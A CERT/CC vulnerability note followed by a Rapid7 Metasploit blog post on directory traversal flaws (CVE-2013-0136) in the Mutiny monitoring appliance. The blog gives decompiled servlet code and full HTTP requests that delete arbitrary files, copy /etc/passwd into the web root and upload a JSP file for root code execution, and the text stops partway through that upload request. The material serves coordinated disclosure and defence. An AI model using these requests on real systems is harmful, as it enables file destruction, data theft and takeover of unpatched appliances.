=== Content from www.kb.cert.org_25182f2d_20250125_054408.html ===


search

menu

icon-carat-right

cmu-wordmark

* ×
* [Home](/vuls/)
* [Notes](/vuls/bypublished/desc/)
* [Search](/vuls/search/)
* [Report a Vulnerability](/vuls/report/)
* [Disclosure Guidance](/vuls/guidance/)
* [VINCE](/vince/)

[[Carnegie Mellon University](https://www.cmu.edu)](https://www.cmu.edu/)

# [Software Engineering Institute](https://www.sei.cmu.edu/)

## CERT Coordination Center

* [Home](/vuls/)
* [Notes](/vuls/bypublished/desc/)
* [Search](/vuls/search/)
* [Report a Vulnerability](/vuls/report/)
* [Disclosure Guidance](/vuls/guidance/)
* [VINCE](/vince/)

* [Home](/vuls/)
* [Notes](/vuls/bypublished/desc/)
* Current:  VU#701572

## Mutiny Appliance contains multiple directory traversal vulnerabilities

#### Vulnerability Note VU#701572

Original Release Date: 2013-05-15 | Last Revised: 2013-05-15

---

### Overview

Mutiny appliance contains multiple directory traversal ([CWE-22](http://cwe.mitre.org/data/definitions/22.html)) vulnerabilities.

### Description

| The Mutiny appliance commands for UPLOAD, DELETE, CUT and COPY are all vulnerable to directory traversal attacks. Additional details may be found in the Rapid7 blog post entitled, "[New 1day Exploits: Mutiny Vulnerabilities](https://community.rapid7.com/community/metasploit/blog/2013/05/15/new-1day-exploits-mutiny-vulnerabilities)". |
| --- |

### Impact

| An authenticated remote attacker may be able to upload, delete, and move files on the system with root privileges. |
| --- |

### Solution

| **Apply an Update**  Mutiny appliance version "[5.0-1.11 (EAGLe) - (02-05-13)](http://www.mutiny.com/mutiny-support/update/)" has been released to address these vulnerabilities. |
| --- |

| **Restrict Network Access**As a general good security practice, only allow connections from trusted hosts and networks. Restricting access would prevent an attacker from connecting to the service from a blocked network location. |
| --- |

### Vendor Information

701572
Filter by status:
All
Affected
Not Affected
Unknown

Filter by content:
 Additional information available

 Sort by:
Status
Alphabetical

Expand all

**Javascript is disabled. Click [here](/vuls/vendor/VU%23701572/) to view vendors.**
### [Mutiny Technologies](#BLUU-96WRVR) Affected

Notified:  April 19, 2013  Updated: May 15, 2013

### Status

Affected

### Vendor Statement

We have not received a statement from the vendor.

### Vendor Information

We are not aware of further vendor information regarding this vulnerability.

### CVSS Metrics

| Group | Score | Vector |
| --- | --- | --- |
| Base | 7.9 | AV:N/AC:M/Au:S/C:C/I:C/A:N |
| Temporal | 6.9 | E:ND/RL:OF/RC:C |
| Environmental | 5.2 | CDP:ND/TD:M/CR:ND/IR:ND/AR:ND |

### References

* <https://community.rapid7.com/community/metasploit/blog/2013/05/15/new-1day-exploits-mutiny-vulnerabilities>
* <http://cwe.mitre.org/data/definitions/22.html>
### Acknowledgements

Thanks to Juan Vazquez for discovering and Tod Beardsley for reporting this vulnerability.

This document was written by Jared Allar.

### Other Information

| **CVE IDs:** | [CVE-2013-0136](http://web.nvd.nist.gov/vuln/detail/CVE-2013-0136) |
| --- | --- |
| **Date Public:** | 2013-05-15 |
| **Date First Published:** | 2013-05-15 |
| **Date Last Updated:** | 2013-05-15 17:20 UTC |
| **Document Revision:** | 19 |

* [About vulnerability notes](https://vuls.cert.org/confluence/display/VIN/Vulnerability%2BNote%2BHelp)
* Contact us about this vulnerability
* [Provide a vendor statement](https://vuls.cert.org/confluence/display/VIN/Case%2BHandling#CaseHandling-Givingavendorstatusandstatement)

Sponsored by [CISA.](https://www.cisa.gov/cybersecurity)

 [Download PGP Key](https://vuls.cert.org/confluence/pages/viewpage.action?pageId=25985026)

[Read CERT/CC Blog](https://insights.sei.cmu.edu/cert/)

[Learn about Vulnerability Analysis](https://www.sei.cmu.edu/research-capabilities/all-work/display.cfm?customel_datapageid_4050=21304)

Carnegie Mellon University

Software Engineering Institute

4500 Fifth Avenue

Pittsburgh, PA 15213-2612

412-268-5800

[Office Locations](http://www.sei.cmu.edu/locations/index.cfm) | [Additional Sites Directory](http://www.sei.cmu.edu/additional-sites-directory/index.cfm) | [Legal](https://vuls.cert.org/confluence/display/VIN/VINCE%2BCode%2Bof%2BConduct#VINCECodeofConduct-TermsofUse) | [Privacy Notice](https://www.sei.cmu.edu/legal/privacy-notice/index.cfm) | [CMU Ethics Hotline](https://www.cmu.edu/hr/ethics-hotline/) | [www.sei.cmu.edu](http://www.sei.cmu.edu)

Â©2022 Carnegie Mellon University

[Contact SEI](https://www.sei.cmu.edu/contact-us/)
#### Contact CERT/CC

 412-268-5800



=== Content from community.rapid7.com_288bdd75_20250125_054410.html ===


[![Rapid7 Home](/Areas/Docs/includes/img/r7-nav/Rapid7_logo.svg)](https://www.rapid7.com/)

* Platform
  + TECHNOLOGYThe Rapid7 Command PlatformAI-Powered Cybersecurity Platform[Explore](/platform/)
  + PLATFORM
  + [PlatformELITE TECHNOLOGY](/platform/)
  + [AI-EngineINTELLIGENT TOOLS](/info/ai-hub-page/)
  + [Rapid7 LabsTRUSTED INTELLIGENCE](/research/)
  + SOLUTIONS
  + [Managed Threat CompleteMANAGED XDR](/services/managed-detection-and-response-mdr/)
  + [Surface CommandATTACK SURFACE MANAGEMENT](/products/command/attack-surface-management-asm/)
  + [Exposure CommandEXPOSURE MANAGEMENT](/products/command/exposure-management/)
* [Products](/products/)
  + NEW!Exposure CommandTake Command of Your Attack Surface[Request Demo](/products/command/request-demo/)
  + DETECTION & RESPONSE
  + [Next-Gen SIEMINSIGHTIDR](/products/insightidr/)
  + [Threat IntelligenceTHREAT COMMAND](/products/threat-command/)
  + EXPOSURE MANAGEMENT
  + [Exposure ManagementEXPOSURE COMMAND](/products/command/exposure-management/)
  + [Attack Surface ManagementSURFACE COMMAND](/products/command/attack-surface-management-asm/)
  + [Vulnerability ManagementINSIGHTVM](/products/insightvm/)
  + [Cloud-Native Application ProtectionINSIGHTCLOUDSEC](/products/insightcloudsec/)
  + [Application Security TestingINSIGHTAPPSEC](/products/insightappsec/)
* [Services](/services/)
  + MXDRManaged Threat Complete24x7 MXDR to secure your extended ecosystem[Request Demo](/services/managed-detection-and-response-mdr/demo/)
  + DETECTION & RESPONSE
  + [Managed XDRMANAGED THREAT COMPLETE](/services/managed-detection-and-response-mdr/)
  + [Incident Response ServicesEXPERIENCING A BREACH?](/services/incident-response-customer-escalation/)
  + EXPOSURE MANAGEMENT
  + [Managed Vulnerability ManagementOPTIMIZED RISK ASSESSMENT](/services/managed-services/vulnerability-management/)
  + [Managed Application SecurityMANAGED DAST](/services/managed-services/managed-appsec/)
  + [Continuous Red TeamingVECTOR COMMAND](/services/continuous-red-team-service/)
  + [Penetration Testing ServicesTEST YOUR DEFENSES](/services/security-consulting/penetration-testing-services/)
* Resources
  + NEWThe 2024 Attack Intelligence ReportRead the latest research by Rapid7 Labs[READ NOW](/research/report/2024-attack-intelligence-report/)
  + STAY CURRENT
  + [About Rapid7 LabsMEET THE RESEARCH TEAM](/research/)
  + [Events & WebinarsCATCH US LIVE](/about/events-webcasts/)
  + [Resources LibraryDIVE INTO THE DETAILS](/resources/)
  + [The Rapid7 BlogSTAY UP-TO-DATE](/blog/)
  + [Exploit DatabaseSEARCH THOUSANDS OF CVES](/db/)
  + [Cybersecurity FundamentalsLEARN THE BASICS](/fundamentals/)
  + PRODUCT SUPPORT
  + [Contact SalesTALK TO AN EXPERT](/contact/)
  + [Customer Support PortalCONTACT SUPPORT](/for-customers/)
  + [Product IntegrationsCONNECT EVERYTHING](https://extensions.rapid7.com/)
  + [Product DocumentationPRODUCT AND SERVICES GUIDES](https://docs.rapid7.com/)
  + [Product Release NotesLATEST FEATURES](https://docs.rapid7.com/release-notes/)
  + [Interactive Product ToursTAKE TOUR](/product-tours/)
* [Company](/about/company/)
  + OVERVIEW
  + [About UsOUR STORY](/about/company/)
  + [LeadershipEXECUTIVE TEAM & BOARD](/about/leadership/)
  + [News & Press ReleasesTHE LATEST FROM OUR NEWSROOM](/about/news/)
  + [CareersJOIN RAPID7](https://careers.rapid7.com/)
  + [Our CustomersTheir Success Stories](/customers/)
  + [PartnersRapid7 Partner Ecosystem](/partners/)
  + [InvestorsInvestor Relations](https://investors.rapid7.com/)
  + COMMUNITY & CULTURE
  + [Social GoodOUR COMMITMENT & APPROACH](/about/social-good/)
  + [Rapid7 Cybersecurity FoundationBUILDING THE FUTURE](/about/rapid7-foundation/)
  + [Diversity, Equity & InclusionEMPOWERING PEOPLE](/about/diversity-equity-and-inclusion/)
  + [Open SourceSTRENGTHENING CYBERSECURITY](/open-source/)
  + [Public PolicyENGAGEMENT & ADVOCACY](/about/public-policy/)
  + [Boston BruinsOur Partnership](/about/rapid7-cybersecurity-partner-boston-bruins/)
* [Partners](/partners/)
* en
  + English
* [![](/Areas/Docs/includes/img/r7-nav/icon-lock.svg) Sign In](https://insight.rapid7.com/saml/SSO)
[Blog](/blog/ "Blog")

* Select
  + [Vulnerability Management](/blog/tag/vulnerability-management/)
  + [MDR](/blog/tag/mdr-managed-detection-response/)
  + [Detection & Response](/blog/tag/detection-and-response/)
  + [Cloud Security](/blog/tag/cloud-security/)
  + [App Security](/blog/tag/application-security/)
  + [Metasploit](/blog/tag/metasploit/)
  + [All Topics](/blog/tags/)

[Start Trial](/trial/insight/)[![Rapid7 Home](/Areas/Docs/includes/img/r7-nav/Rapid7_logo.svg)](https://www.rapid7.com/)

* Platform
  + TECHNOLOGYThe Rapid7 Command PlatformAI-Powered Cybersecurity Platform[Explore](/platform/)
  + PLATFORM
  + [PlatformELITE TECHNOLOGY](/platform/)
  + [AI-EngineINTELLIGENT TOOLS](/info/ai-hub-page/)
  + [Rapid7 LabsTRUSTED INTELLIGENCE](/research/)
  + SOLUTIONS
  + [Managed Threat CompleteMANAGED XDR](/services/managed-detection-and-response-mdr/)
  + [Surface CommandATTACK SURFACE MANAGEMENT](/products/command/attack-surface-management-asm/)
  + [Exposure CommandEXPOSURE MANAGEMENT](/products/command/exposure-management/)
* [Products](/products/)
  + NEW!Exposure CommandTake Command of Your Attack Surface[Request Demo](/products/command/request-demo/)
  + DETECTION & RESPONSE
  + [Next-Gen SIEMINSIGHTIDR](/products/insightidr/)
  + [Threat IntelligenceTHREAT COMMAND](/products/threat-command/)
  + EXPOSURE MANAGEMENT
  + [Exposure ManagementEXPOSURE COMMAND](/products/command/exposure-management/)
  + [Attack Surface ManagementSURFACE COMMAND](/products/command/attack-surface-management-asm/)
  + [Vulnerability ManagementINSIGHTVM](/products/insightvm/)
  + [Cloud-Native Application ProtectionINSIGHTCLOUDSEC](/products/insightcloudsec/)
  + [Application Security TestingINSIGHTAPPSEC](/products/insightappsec/)
* [Services](/services/)
  + MXDRManaged Threat Complete24x7 MXDR to secure your extended ecosystem[Request Demo](/services/managed-detection-and-response-mdr/demo/)
  + DETECTION & RESPONSE
  + [Managed XDRMANAGED THREAT COMPLETE](/services/managed-detection-and-response-mdr/)
  + [Incident Response ServicesEXPERIENCING A BREACH?](/services/incident-response-customer-escalation/)
  + EXPOSURE MANAGEMENT
  + [Managed Vulnerability ManagementOPTIMIZED RISK ASSESSMENT](/services/managed-services/vulnerability-management/)
  + [Managed Application SecurityMANAGED DAST](/services/managed-services/managed-appsec/)
  + [Continuous Red TeamingVECTOR COMMAND](/services/continuous-red-team-service/)
  + [Penetration Testing ServicesTEST YOUR DEFENSES](/services/security-consulting/penetration-testing-services/)
* Resources
  + NEWThe 2024 Attack Intelligence ReportRead the latest research by Rapid7 Labs[READ NOW](/research/report/2024-attack-intelligence-report/)
  + STAY CURRENT
  + [About Rapid7 LabsMEET THE RESEARCH TEAM](/research/)
  + [Events & WebinarsCATCH US LIVE](/about/events-webcasts/)
  + [Resources LibraryDIVE INTO THE DETAILS](/resources/)
  + [The Rapid7 BlogSTAY UP-TO-DATE](/blog/)
  + [Exploit DatabaseSEARCH THOUSANDS OF CVES](/db/)
  + [Cybersecurity FundamentalsLEARN THE BASICS](/fundamentals/)
  + PRODUCT SUPPORT
  + [Contact SalesTALK TO AN EXPERT](/contact/)
  + [Customer Support PortalCONTACT SUPPORT](/for-customers/)
  + [Product IntegrationsCONNECT EVERYTHING](https://extensions.rapid7.com/)
  + [Product DocumentationPRODUCT AND SERVICES GUIDES](https://docs.rapid7.com/)
  + [Product Release NotesLATEST FEATURES](https://docs.rapid7.com/release-notes/)
  + [Interactive Product ToursTAKE TOUR](/product-tours/)
* [Company](/about/company/)
  + OVERVIEW
  + [About UsOUR STORY](/about/company/)
  + [LeadershipEXECUTIVE TEAM & BOARD](/about/leadership/)
  + [News & Press ReleasesTHE LATEST FROM OUR NEWSROOM](/about/news/)
  + [CareersJOIN RAPID7](https://careers.rapid7.com/)
  + [Our CustomersTheir Success Stories](/customers/)
  + [PartnersRapid7 Partner Ecosystem](/partners/)
  + [InvestorsInvestor Relations](https://investors.rapid7.com/)
  + COMMUNITY & CULTURE
  + [Social GoodOUR COMMITMENT & APPROACH](/about/social-good/)
  + [Rapid7 Cybersecurity FoundationBUILDING THE FUTURE](/about/rapid7-foundation/)
  + [Diversity, Equity & InclusionEMPOWERING PEOPLE](/about/diversity-equity-and-inclusion/)
  + [Open SourceSTRENGTHENING CYBERSECURITY](/open-source/)
  + [Public PolicyENGAGEMENT & ADVOCACY](/about/public-policy/)
  + [Boston BruinsOur Partnership](/about/rapid7-cybersecurity-partner-boston-bruins/)
* [Partners](/partners/)

* en
  + English
* [![](/Areas/Docs/includes/img/r7-nav/icon-lock.svg)Sign In](https://insight.rapid7.com/saml/SSO)
[![Rapid7 logo](/Areas/Docs/includes/img/r7-nav/Rapid7_logo-short.svg)](https://www.rapid7.com/)

* [Blog](/blog/ "Blog")
* [Vulnerability Management](/blog/tag/vulnerability-management/)
* [MDR](/blog/tag/mdr-managed-detection-response/)
* [Detection & Response](/blog/tag/detection-and-response/)
* [Cloud Security](/blog/tag/cloud-security/)
* [App Security](/blog/tag/application-security/)
* [Metasploit](/blog/tag/metasploit/)
* [All Topics](/blog/tags/)
[Start Trial](/trial/insight/)

# New 1day Exploits: Mutiny Vulnerabilities

* May 15, 2013
* 8 min read
* [Juan Vazquez](/blog/author/juan-vazquez/)

*Last updated at Mon, 28 Aug 2017 15:52:21 GMT*

Back in March we published an exploit module for [Mutiny Remote Code Execution](http://www.metasploit.com/modules/exploit/multi/http/mutiny_subnetmask_exec). [Mutiny](http://www.mutiny.com/) "is a self-contained appliance for monitoring network-attached devices such as servers, switches, routers and printers. It has been designed to be simple to use, being aimed at the person who is more interested in the actual data gathered rather than the science of gathering the data." (Source: Mutiny User Guide). That module abused [CVE-2012-3001](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-3001), a command injection issue in the frontend application which allowed any authenticated user, with access to the admin interface, to execute os commands with root privileges. While developing that exploit, we took a look at the last version of the Mutiny FrontEnd available at that time (5.0-1.07) and found others issues, grouped under [CVE-2013-0136](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-0136), which have the plus of being exploitable from any authenticated role.

## Vulnerabilities Summary

The Mutiny Appliance provides a Web Frontend, where the users can configure the system and monitor the data collected by the appliance. The Frontend provides four access roles: “Super Admin”, “Administrator”, “Engineer” and “View only”. All the roles allow the user to access to the “Documents” section, where multiple weaknesses have been detected allowing

* To delete any file from the remote file system with root privileges.
* To copy and move files in the remote file system with root privileges, allowing also to download/retrieve these files.
* To upload arbitrary files to the remote file system and ultimately execute arbitrary code with root privileges.

## Disclosure Timeline

| Date | Description |
| --- | --- |
| 2013-03-08 | Initial discovery by Juan Vazquez, Metasploit Researcher |
| 2013-03-09 | Draft advisory and Metasploit module written |
| 2013-03-11 | Initial disclosure to the vendor, Mutiny Technology |
| 2013-03-12 | Follow-up with vendor |
| 2013-03-27 | Disclosure to CERT/CC2013-05-14Version 5.0-1.11 tested and not vulnerable to the disclosed exploitation (1) |
| 2013-05-15 | Public Disclosure |
| 2013-05-15 | Metasploit exploit module published |

(1) Prior to public disclosure the last version available has been tested and the disclosed exploit techniques don't work anymore. The tested version has been "5.0-1.11 (EAGLe) - (02-05-13)". Since the vendor didn't warn us about the patch neither asked us to review the patch we can't assure the current patch is 100% confident and secure, neither have details about revisions between 5.0.1-07 and 5.0.1-11 which could be vulnerable. We encourage you to use the current Metasploit modules in order to test your Mutiny installation for the disclosed vulnerabilities.

## Technical Analysis

The Web Frontend of Mutiny is provided in part by a Java Web Application. This frontend provides a "Documents" section for authenticated users for any role:

![](https://blog.rapid7.com/content/images/post-images/17340/documents_view.PNG)

The Documents functions are in part provided by a servlet named "EditDocument". This servlets provides several "Documents" functions such as upload, copy, move and delete documents:

```
protected void doPost(HttpServletRequest
httpservletrequest, HttpServletResponse httpservletresponse)
throws ServletException, IOException
.   .
s = httpservletrequest.getParameter("operation");
if(ServletFileUpload.isMultipartContent(httpservletrequest))
s = "UPLOAD";
.   .   .
if(!s.equals("NEW")) goto _L2; else goto _L1
.   .   .
if(!s.equals("RENAME")) goto _L5; else goto _L4
.   .   .
if(!s.equals("DELETE")) goto _L7; else goto _L6
.   .   .
if(!s.equals("CUT") && !s.equals("COPY")) goto _L9; else goto _L8

```

* The UPLOAD operation can be abused via a Directory Traversal vulnerability in the “uploadPath” parameter  to upload arbitrary file and contents to the remote filesystem with root privileges:

```
if(s.equals("UPLOAD"))
{
    ServletFileUpload
    servletfileupload = new ServletFileUpload(new DiskFileItemFactory());
    List list = null;
    try   {
        list = servletfileupload.parseRequest(httpservletrequest);
        }
    catch(FileUploadException fileuploadexception)   {
    fileuploadexception.printStackTrace();
        }
    String s6 = null;
    FileItem fileitem = null;
    Iterator iterator = list.iterator();
    do   {
    if(!iterator.hasNext())
    break;   FileItem fileitem1 = (FileItem)iterator.next();
    if(fileitem1.isFormField() &&
    fileitem1.getFieldName().equals("uploadPath"))
    s6 = fileitem1.getString(); // User controlled
    else
    if(!fileitem1.isFormField() && fileitem1.getFieldName().equals("uploadFile"))
    fileitem = fileitem1;
    // User controlled
    }
    while(true);
    if(s6.length() == 0)
    {
    System.out.println("Error: uploadPath not set.");
    s6 = "/documents";
    }
    if(fileitem == null)
    {
    System.out.println("Error: uploadFile not set.");
    }
    else
    {
    File file5 = new File(DocumentUtils.root, s6);
    // Directory Traversal
    File file7 = new File(file5, fileitem.getName());
    file7.getParentFile().mkdirs();
    file7 = DocumentUtils.getUniqueFile(file7, false);
    file7.createNewFile();
    try
    {
    fileitem.write(file7);
    // Write file
    if(file7.exists() && file7.length() == fileitem.getSize())
    flag = true;
    if(debug)
    System.out.println((new StringBuilder()).append(s).append(": ").append(file7.getPath()).toString());
    }
    catch(Exception exception)
    {
    exception.printStackTrace();
    }
  }
}

```

* The DELETE operation is also affected by a directory traversal vulnerability in the “paths[]” parameter, which allows to delete arbitrary files with root privileges:

```
_L5:
if(!s.equals("DELETE")) goto _L7; else goto _L6 _L6:
String as1[] = httpservletrequest.getParameterValues("paths[]");
// User controlled
String as2[] = as1;
int j = as2.length;
for(int k = 0; k < j; k )
{
String s7 = as2[k];
File file6 = new File(DocumentUtils.root, s7);
// Directory Traversal
if(!isValid(file6))
return;
if(file6.isDirectory())
FileUtils.deleteDirectory(file6);
// Delete directory
else
flag = file6.delete();
// Delete file
if(debug)
System.out.println((new StringBuilder()).append("DELETE: ").append(file6.getPath()).toString());
}

```

* Also the CUT and COPY operation is also affected by directory traversal vulnerabilities in the “paths[]” and “newPath” parameters, which allows to copy and move files around the remote file system with root privileges:

```
if(!s.equals("CUT") && !s.equals("COPY")) goto _L9; else goto _L8 _L8:
File file2;
String as3[];
String s4 = httpservletrequest.getParameter("newPath");
file2 = new File(DocumentUtils.root, s4);
// Directory Traversal in newPath
as3 = httpservletrequest.getParameterValues("paths[]");
if(as3 == null) goto _L3; else goto _L10 _L10:
String as4[];
int l;
int i1;
as4 = as3;
l = as4.length;
i1 = 0; _L11:
File file8;
File file9;
FileInputStream fileinputstream;
FileOutputStream fileoutputstream;
if(i1 >= l)
break;
/* Loop/switch isn't completed */
String s8 = as4[i1];
file8 = new File(DocumentUtils.root, s8);
// Directory traversal in paths[]
if(!isValid(file8))
return;
file9 = new File(file2, file8.getName());
// Directory traversal in newPath
file9 = DocumentUtils.getUniqueFile(file9, file8.isDirectory());
if(debug)
System.out.println((new StringBuilder()).append(s).append(": ").append(file9.getPath()).toString());
file9.getParentFile().mkdirs();
if(s.equals("CUT"))
{
flag = file8.renameTo(file9);
// CUT operation affected by directory traversals
break MISSING_BLOCK_LABEL_881;
}
if(!s.equals("COPY"))
break MISSING_BLOCK_LABEL_881;
if(!file9.exists())
file9.createNewFile();
fileinputstream = null;
fileoutputstream = null;
fileinputstream = new FileInputStream(file8);
// COPY operationaffected by directory traversals
fileoutputstream = new FileOutputStream(file9);
byte abyte0[] = new byte[4096];
int j1;
while((j1 = fileinputstream.read(abyte0)) > 0)
fileoutputstream.write(abyte0, 0, j1);
flag = true;
fileinputstream.close();
fileoutputstream.close();
break MISSING_BLOCK_LABEL_881;
Exception exception1;
exception1;
System.err.println(exception1.getMessage());
fileinputstream.close();
fileoutputstream.close();
break MISSING_BLOCK_LABEL_881;
Exception exception2;
exception2;
fileinputstream.close();
fileoutputstream.close();
throw exception2;
i1 ;
if(true) goto _L11; else goto _L3

```
## Exploitation

After examining the “doPost()” function from the “EditDocument” servlet,  requests to abuse these functions have been built.

### DELETE operation

The next request allows deleting an arbitrary file from the filesystem:

POST /interface/EditDocument HTTP/1.1

Host: 192.168.1.177

User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10\_7\_5) AppleWebKit/536.26.17 (KHTML, like Gecko) Version/6.0.2 Safari/536.26.17

Content-Length: 76

Accept: */*

Origin: [http://192.168.1.177](http://192.168.1.177/)

X-Requested-With: XMLHttpRequest

Content-Type: application/x-www-form-urlencoded

Referer: <http://192.168.1.177/interface/documents.jsp>

Accept-Language: en-us

Accept-Encoding: gzip, deflate

Cookie: JSESSIONID=611F495538F214B351A860D32273DB89; JSESSIONIDSSO=EF00467D61F67EA2CE86010762914E4D

Connection: keep-alive

Proxy-Connection: keep-alive

operation=DELETE&**paths[]=../../../../test.msf**

In this case the “/test.msf” will be deleted in the remote file system. The 4 level traversal is due to “DocumentUtils.root” by default pointing to “/var/MUTINY/upload/documents” in the Linux based appliance.

The response to the request informs if the file deletion has been successful:

HTTP/1.1 200 OK

Server: Apache-Coyote/1.1

X-UA-Compatible: IE=10

Content-Type: application/json;charset=UTF-8

Content-Length: 16

Date: Fri, 08 Mar 2013 02:16:18 GMT

**{"success":true}**

### COPY operation

The copy operation allows copying arbitrary files in the remote file system with root privileges. By copying arbitrary files to the default web root in the appliance it's possible to retrieve arbitrary files.

The next request allows copying the “/etc/passwd” file to the web root for mobile devices, by default located at “/usr/jakarta/tomcat/webapps/ROOT/m” in the Mutiny Linux based appliance:

POST /interface/EditDocument HTTP/1.1

Host: 192.168.1.177

User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10\_7\_5) AppleWebKit/536.26.17 (KHTML, like Gecko) Version/6.0.2 Safari/536.26.17

Content-Length: 111

Accept: */*

Origin: [http://192.168.1.177](http://192.168.1.177/)

X-Requested-With: XMLHttpRequest

Content-Type: application/x-www-form-urlencoded

Referer: <http://192.168.1.177/interface/documents.jsp>

Accept-Language: en-us

Accept-Encoding: gzip, deflate

Cookie: JSESSIONID=14CE95F1ED56321B4B226DF669D691C0; JSESSIONIDSSO=FA98603965548C3FB1F67BC5121A75DC

Connection: keep-alive

Proxy-Connection: keep-alive

operation=COPY&**paths[]=../../../../etc/passwd.txt**&**newPath=../../../../usr/jakarta/tomcat/webapps/ROOT/m/**

The response to the request informs if the file deletion has been successful:

HTTP/1.1 200 OK

Server: Apache-Coyote/1.1

X-UA-Compatible: IE=10

Content-Type: application/json;charset=UTF-8

Content-Length: 16

Date: Fri, 08 Mar 2013 04:11:17 GMT

**{"success":true}**

By accessing to <http://appliance/m/passwd> is possible to retrieve the remote file:

![](https://blog.rapid7.com/content/images/post-images/17340/copy_result.PNG)

### UPLOAD operation

The upload operation allows uploading an arbitrary file to the file system with root privileges. By uploading a JSP file to the “/usr/jakarta/tomcat/webapps/ROOT/m” default location, arbitrary Java can be executed with root privileges by later invoking the JSP file via the web interface. The next request allows uploading JSP code to the "/usr/jakarta/tomcat/webapps/ROOT/m/msf.jsp” location:

POST /interface/EditDocument HTTP/1.1

Host: 192.168.1.177

User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10\_7\_5) AppleWebKit/536.26.17 (KHTML, like Gecko) Version/6.0.2 Safari/536.26.17

Content-Length: 491

Accept: */*

Origin: [http://192.168.1.177](http://192.168.1.177/)

X-Requested-With: XMLHttpRequest

Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryPxNcR2XfK8d5gMeU

Referer: <http://192.168.1.177/interface/documents.jsp>

Accept-Language: en-us

Accept-Encoding: gzip, deflate

Cookie: JSESSIONID=611F495538F214B351A860D32273DB89; JSESSIONIDSSO=EF00467D61F67EA2CE86010762914E4D

Connection: keep-alive

Proxy-Connection: keep-alive

------WebKitFormBoundaryPxNcR2XfK8d5gMeU

Content-Disposition: form-data; **name="uploadFile"; filename="msf.jsp"**

Content-Type: application/octet-stream

Metasploit Test Page

<%="Metasploit Test" %>


